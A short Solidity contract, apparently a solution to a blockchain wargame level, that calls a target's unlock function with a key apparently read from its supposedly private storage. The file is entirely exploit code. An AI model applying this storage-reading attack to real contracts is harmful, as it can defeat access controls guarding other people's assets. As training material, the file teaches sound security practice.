// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    Privacy target = Privacy(0x531A5a19B5b64705f1094b585F972Fa031b82716);
    bytes32 payload = 0xb9e4d7fbe142a59d3e5dc7bdaef9d0a286724d01243fda48529547d410508a37;
    bytes16 payload16 = bytes16(payload);

    function attack() public {
        target.unlock(payload16);
    }
}